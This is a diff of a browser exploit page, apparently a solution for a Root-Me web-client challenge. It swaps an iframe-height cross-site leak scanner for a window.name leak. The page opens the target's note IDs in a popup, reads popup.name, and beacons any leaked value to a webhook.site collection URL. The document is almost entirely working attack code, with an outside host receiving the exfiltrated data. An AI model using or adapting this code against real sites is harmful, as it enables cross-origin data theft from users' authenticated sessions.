@@ -1,20 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Height XS-Leak Scanner</title>
+    <title>Window Name XS-Leak</title>
 </head>
 <body>
-    <h1>Scanning notes...</h1>
+    <h1>Checking notes...</h1>
     <div id="status"></div>
     <script>
         const TARGET_BASE = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
         const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
         const START_ID = 1378;
         const END_ID = 2000;
-        const DELAY_MS = 500;               // delay between IDs
-        const BASELINE_ID = -1;              // non-existent ID
-        const IFRAME_TIMEOUT = 2000;         // max wait for iframe to load
-        const HEIGHT_THRESHOLD = 20;         // extra pixels above baseline to consider a hit
+        const DELAY_MS = 500;
 
         function updateStatus(msg) {
             const div = document.getElementById('status');
@@ -22,76 +19,42 @@
             console.log(msg);
         }
 
-        // Load an ID in an iframe and return its rendered height
-        async function measureHeight(id) {
+        async function checkWindowName(id) {
             return new Promise((resolve) => {
                 const url = TARGET_BASE + id;
-                const iframe = document.createElement('iframe');
-                // Position off-screen so it doesn't interfere
-                iframe.style.position = 'absolute';
-                iframe.style.top = '-9999px';
-                iframe.style.left = '-9999px';
-                iframe.style.width = '100%';
-                iframe.style.height = 'auto';
-                iframe.style.display = 'block';
-                iframe.src = url;
-
-                let resolved = false;
-                const timeout = setTimeout(() => {
-                    if (!resolved) {
-                        resolved = true;
-                        const height = iframe.offsetHeight;
-                        updateStatus(`ID ${id} (timeout): height = ${height}px`);
-                        document.body.removeChild(iframe);
-                        resolve(height);
+                const popup = window.open(url, 'leakWindow');
+                if (!popup) {
+                    updateStatus(`Popup blocked for ID ${id}`);
+                    resolve(null);
+                    return;
+                }
+                const initialName = 'initial_' + Date.now() + '_' + Math.random();
+                popup.name = initialName;
+                setTimeout(() => {
+                    let newName = popup.name;
+                    try {
+                        popup.close();
+                    } catch(e) {}
+                    if (newName && newName !== initialName) {
+                        resolve(newName);
+                    } else {
+                        resolve(null);
                     }
-                }, IFRAME_TIMEOUT);
-
-                iframe.onload = () => {
-                    clearTimeout(timeout);
-                    if (resolved) return;
-                    resolved = true;
-                    // Allow layout to settle before reading height
-                    setTimeout(() => {
-                        const height = iframe.offsetHeight;
-                        updateStatus(`ID ${id}: height = ${height}px`);
-                        document.body.removeChild(iframe);
-                        resolve(height);
-                    }, 100);
-                };
-                document.body.appendChild(iframe);
+                }, 1500);
             });
         }
 
-        // Measure baseline height using a non-existent ID
-        async function getBaseline() {
-            updateStatus(`Measuring baseline using ID ${BASELINE_ID}...`);
-            const height = await measureHeight(BASELINE_ID);
-            updateStatus(`Baseline height = ${height}px`);
-            return height;
-        }
-
-        // Check if the given ID is likely a valid note
-        async function checkId(id, baselineHeight) {
-            const height = await measureHeight(id);
-            return height > baselineHeight + HEIGHT_THRESHOLD;
-        }
-
-        function reportId(id) {
-            const url = `${WEBHOOK}?id=${id}`;
-            new Image().src = url;
-            updateStatus(`✅ Found note ID: ${id} → reported`);
-        }
-
         async function run() {
-            const baseline = await getBaseline();
-            updateStatus(`Starting scan from ${START_ID} to ${END_ID}...`);
+            updateStatus(`Scanning IDs ${START_ID} to ${END_ID}...`);
             for (let id = START_ID; id <= END_ID; id++) {
-                const exists = await checkId(id, baseline);
-                if (exists) {
-                    reportId(id);
-                    break;                // stop after first hit, remove to continue scanning
+                const leaked = await checkWindowName(id);
+                if (leaked) {
+                    const reportUrl = `${WEBHOOK}?id=${id}&name=${encodeURIComponent(leaked)}`;
+                    new Image().src = reportUrl;
+                    updateStatus(`✅ Found ID ${id} with window.name: ${leaked}`);
+                    break; // remove break to continue scanning
                 }
+                updateStatus(`ID ${id}: no name change`);
                 await new Promise(r => setTimeout(r, DELAY_MS));
             }
             updateStatus('Scan complete.');
